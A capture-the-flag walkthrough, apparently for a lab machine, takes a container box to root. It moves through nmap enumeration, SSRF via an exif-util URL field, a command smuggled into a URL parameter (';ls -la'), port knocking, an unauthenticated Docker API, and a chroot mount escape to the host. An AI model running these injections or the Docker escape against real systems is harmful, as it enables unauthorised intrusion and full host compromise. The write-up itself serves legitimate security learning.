## The Great Escape

# Enumeration
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-14 14:19 PST
Nmap scan report for 10.10.26.86
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh?
| fingerprint-strings:
|   GenericLines:
|_    j$ j_x
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    nginx 1.19.6
| http-robots.txt: 3 disallowed entries
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
|_http-title: docker-escape-nuxt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.91%I=7%D=2/14%Time=6029A1EA%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8,"j\$\x20j_x\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/14%OT=22%CT=1%CU=44648%PV=Y%DS=4%DC=T%G=Y%TM=6029A2A
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=3F%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 4 hops

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   14.78 ms  10.13.0.1
2   ... 3
4   156.37 ms 10.10.26.86

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.20 seconds
```

```
post login panel curl format:
curl 'http://10.10.26.86/api/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json;charset=utf-8' -H 'Origin: http://10.10.26.86' -H 'Connection: keep-alive' -H 'Referer: http://10.10.26.86/login' -H 'Cookie: auth.strategy=local; auth.redirect=%2Fcourses; auth._token.local=false; auth._token_expiration.local=false' --data-raw '{"username":"admin","password":"admin"}'
```

Makes popups to display wrong password cant brute force simply
Is also configured through gobuster to display 200 response for page that don't exist therefore enumeration is difficult
Our nmap scan did point out a robots.txt file with the following

# robots.txt
```
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```
# exif-util

This allows upload of files or use of url to read exif data of a file.
The upload side of this doesn't seem to have visible results however using the url side can work

```
http://10.10.225.48/_nuxt/img/logo-light.49baa3d.png

EXIF:
----------------------
[PNG-IHDR] Image Width - 600
[PNG-IHDR] Image Height - 300
[PNG-IHDR] Bits Per Sample - 8
[PNG-IHDR] Color Type - True Color with Alpha
[PNG-IHDR] Compression Type - Deflate
[PNG-IHDR] Filter Method - Adaptive
[PNG-IHDR] Interlace Method - No Interlace
[PNG-sRGB] sRGB Rendering Intent - Perceptual
[PNG-gAMA] Image Gamma - 0.455
[PNG-pHYs] Pixels Per Unit X - 3778
[PNG-pHYs] Pixels Per Unit Y - 3778
[PNG-pHYs] Unit Specifier - Metres
[File Type] Detected File Type Name - PNG
[File Type] Detected File Type Long Name - Portable Network Graphics
[File Type] Detected MIME Type - image/png
[File Type] Expected File Name Extension - png

XMP:
----------------------
```

This seems to be a vector for SSRF so lets try and read another page on the robots.txt /api directly and through directory traversal

exif-util http://10.10.225.48/api
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nothing to see here</title>
</head>
<body>

<p>Nothing to see here, move along...</p>

</body>
</html>
```

exif-util http://10.10.225.48/exif-util/../api
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nothing to see here</title>
</head>
<body>

<p>Nothing to see here, move along...</p>

</body>
</html>
```

same result so we can use directory traversal but after several tries we can't seem to beyond the web directory itself so we should likely explore trying to find the bak.txt file that has been disallowed 

exif-util.bak.txt
```
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
```

http://api-dev-backup:8080/exif stands out
so lets try and utilize this backup api to 

/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
total 49260
drwxr-xr-x 1 root root     4096 Jan  7 17:42 .
drwxr-xr-x 1 root root     4096 Jan  7 22:14 ..
-rwxr-xr-x 1 root root 50433552 Jan  7 16:46 application

```

awesome this works so now lets try and explore the rest of the filesystem

10.10.249.5/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la /
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
total 76
drwxr-xr-x  1 root root 4096 Jan  7 22:14 .
drwxr-xr-x  1 root root 4096 Jan  7 22:14 ..
-rwxr-xr-x  1 root root    0 Jan  7 22:14 .dockerenv
drwxr-xr-x  1 root root 4096 Jan  6 20:51 bin
drwxr-xr-x  2 root root 4096 Nov 22 12:37 boot
drwxr-xr-x  5 root root  340 Feb 21 20:40 dev
drwxr-xr-x  1 root root 4096 Jan  7 22:14 etc
drwxr-xr-x  2 root root 4096 Nov 22 12:37 home
drwxr-xr-x  1 root root 4096 Dec  9 23:22 lib
drwxr-xr-x  2 root root 4096 Dec  9 23:22 lib64
drwxr-xr-x  2 root root 4096 Dec  9 23:22 media
drwxr-xr-x  2 root root 4096 Dec  9 23:22 mnt
drwxr-xr-x  2 root root 4096 Dec  9 23:22 opt
dr-xr-xr-x 95 root root    0 Feb 21 20:40 proc
drwx------  1 root root 4096 Jan  7 16:48 root
drwxr-xr-x  3 root root 4096 Dec  9 23:22 run
drwxr-xr-x  2 root root 4096 Dec  9 23:22 sbin
drwxr-xr-x  2 root root 4096 Dec  9 23:22 srv
dr-xr-xr-x 13 root root    0 Feb 21 20:58 sys
drwxrwxrwt  1 root root 4096 Jan  7 22:15 tmp
drwxr-xr-x  1 root root 4096 Dec  9 23:22 usr
drwxr-xr-x  1 root root 4096 Dec  9 23:22 var
drwxr-xr-x  1 root root 4096 Jan  7 17:42 work
```

after exploring a bit in root we find the following
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
total 28
drwx------ 1 root root 4096 Jan  7 16:48 .
drwxr-xr-x 1 root root 4096 Jan  7 22:14 ..
lrwxrwxrwx 1 root root    9 Jan  6 20:51 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4096 Jan  7 16:48 .git
-rw-r--r-- 1 root root   53 Jan  6 20:51 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7 16:46 dev-note.txt
```

so we read the dev-note.txt file
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is REDACTED

Cheers,

Hydra
```

so we have a password but it doesn't seem to work for us in ssh or on the server so perhaps we need to use this git repository to find more information

git -C /root log
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

lets show this last one a3d30a7d0510dc6565ff9316e3fb84434916dee8
```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..89dcd01
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+REDACTED
\ No newline at end of file
```

we found the root flag and it looks like we need to do a port knock sequence to open the docker port, which upon lookup should default to 2375

knock 10.10.249.5 42 1337 10420 6969 63000
then a quick
nmap -p 2375 10.10.249.5
```
# nmap 10.10.249.5 -p 2375
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 13:12 PST
Nmap scan report for 10.10.249.5
Host is up (0.15s latency).

PORT     STATE SERVICE
2375/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

our docker port is now open!
```
docker -H 10.10.249.5:2375 images
REPOSITORY                                    TAG       IMAGE ID       CREATED         SIZE
exif-api-dev                                  latest    4084cb55e1c7   6 weeks ago     214MB
exif-api                                      latest    923c5821b907   6 weeks ago     163MB
frontend                                      latest    577f9da1362e   6 weeks ago     138MB
endlessh                                      latest    7bde5182dc5e   6 weeks ago     5.67MB
nginx                                         latest    ae2feff98a0c   2 months ago    133MB
debian                                        10-slim   4a9cd57610d6   2 months ago    69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   2 months ago    103MB
alpine                                        3.9       78a2ce922f86   10 months ago   5.55MB
```
```
docker -H 10.10.249.5:2375 ps
CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS          PORTS                  NAMES
49fe455a9681   frontend       "/docker-entrypoint.…"   6 weeks ago   Up 37 minutes   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
4b51f5742aad   exif-api-dev   "./application -Dqua…"   6 weeks ago   Up 37 minutes                          dockerescapecompose_api-dev-backup_1
cb83912607b9   exif-api       "./application -Dqua…"   6 weeks ago   Up 37 minutes   8080/tcp               dockerescapecompose_api_1
548b701caa56   endlessh       "/endlessh -v"           6 weeks ago   Up 37 minutes   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
```

We find that the api is exposed and we can look at the containers running, looks like that ssh port we found was a blackhole hence the inability to use the credential we found earlier
so let utilize this frontend container dockerescapecompose_frontend_1 to try and execute /bin/bash
```
docker -H 10.10.249.5:2375 exec -it dockerescapecompose_frontend_1 /bin/bash
root@docker-escape:/# ls -la
total 88
drwxr-xr-x  1 root root 4096 Jan  7 22:15 .
drwxr-xr-x  1 root root 4096 Jan  7 22:15 ..
-rwxr-xr-x  1 root root    0 Jan  7 22:15 .dockerenv
drwxr-xr-x  2 root root 4096 Dec  9 23:22 bin
drwxr-xr-x  2 root root 4096 Nov 22 12:37 boot
drwxr-xr-x  5 root root  340 Feb 21 20:40 dev
drwxr-xr-x  1 root root 4096 Dec 15 20:20 docker-entrypoint.d
-rwxrwxr-x  1 root root 1202 Dec 15 20:20 docker-entrypoint.sh
drwxr-xr-x  1 root root 4096 Jan  7 22:15 etc
drwxr-xr-x  2 root root 4096 Nov 22 12:37 home
drwxr-xr-x  1 root root 4096 Dec 15 20:20 lib
drwxr-xr-x  2 root root 4096 Dec  9 23:22 lib64
drwxr-xr-x  2 root root 4096 Dec  9 23:22 media
drwxr-xr-x  2 root root 4096 Dec  9 23:22 mnt
drwxr-xr-x  2 root root 4096 Dec  9 23:22 opt
dr-xr-xr-x 95 root root    0 Feb 21 20:40 proc
drwx------  2 root root 4096 Dec  9 23:22 root
drwxr-xr-x  1 root root 4096 Feb 21 20:40 run
drwxr-xr-x  2 root root 4096 Dec  9 23:22 sbin
drwxr-xr-x  2 root root 4096 Dec  9 23:22 srv
dr-xr-xr-x 13 root root    0 Feb 21 20:58 sys
drwxrwxrwt  1 root root 4096 Dec 15 20:20 tmp
drwxr-xr-x  1 root root 4096 Dec  9 23:22 usr
drwxr-xr-x  1 root root 4096 Dec  9 23:22 var
root@docker-escape:/#
```

we eventually find the webserver in /usr/share/nginx/html/
in .wellknown we find the following
```
root@docker-escape:/usr/share/nginx/html/.well-known# cat security.txt
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```
so we do the following
``
curl --HEAD 10.10.249.5/api/fl46
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Sun, 21 Feb 2021 21:39:54 GMT
Connection: keep-alive
flag: REDACTED
``
back to escpaing the container we saw alpine in the images and we find a oneliner on gtfobins to abuse it
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
so we modifiy it with the tag 
to do the following
docker -H 10.10.249.5:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
and we are root on the actual system!
